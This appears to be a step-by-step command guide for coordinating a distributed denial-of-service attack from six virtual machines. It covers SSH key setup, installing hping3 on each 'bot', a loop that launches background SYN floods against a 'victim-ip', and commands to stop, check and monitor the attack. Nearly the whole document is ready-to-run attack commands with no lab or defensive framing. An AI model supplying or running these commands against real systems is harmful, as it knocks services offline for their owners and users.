
---

1. **Generate SSH key on control VM (if not done):**

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""
```

2. **Copy SSH key to each VM (replace user and IPs):**

```bash
ssh-copy-id user@vm1-ip
ssh-copy-id user@vm2-ip
ssh-copy-id user@vm3-ip
ssh-copy-id user@vm4-ip
ssh-copy-id user@vm5-ip
ssh-copy-id user@vm6-ip
```

3. **Install hping3 on all VMs (run once per VM):**

```bash
ssh user@vm1-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm2-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm3-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm4-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm5-ip 'sudo apt-get update && sudo apt-get install -y hping3'
ssh user@vm6-ip 'sudo apt-get update && sudo apt-get install -y hping3'
```

4. **Prepare a bash one-liner to start hping3 DoS simultaneously from control VM:**

Create a file `vms.txt` listing IPs of all bots:

```
vm1-ip
vm2-ip
vm3-ip
vm4-ip
vm5-ip
vm6-ip
```

5. **Run simultaneous DoS from all bots:**

```bash
target_ip="victim-ip"
for ip in $(cat vms.txt); do
  ssh user@$ip "nohup sudo hping3 -S --flood $target_ip > /dev/null 2>&1 &"
done
```

6. **To stop all attacks:**

```bash
for ip in $(cat vms.txt); do
  ssh user@$ip "sudo pkill hping3"
done
```

7. **Check if hping3 is running on bots:**

```bash
for ip in $(cat vms.txt); do
  ssh user@$ip "pgrep hping3 && echo 'Running on $ip' || echo 'Not running on $ip'"
done
```

8. **Optional: Monitor attack from control VM by pinging target:**

```bash
ping -c 5 victim-ip
```

---
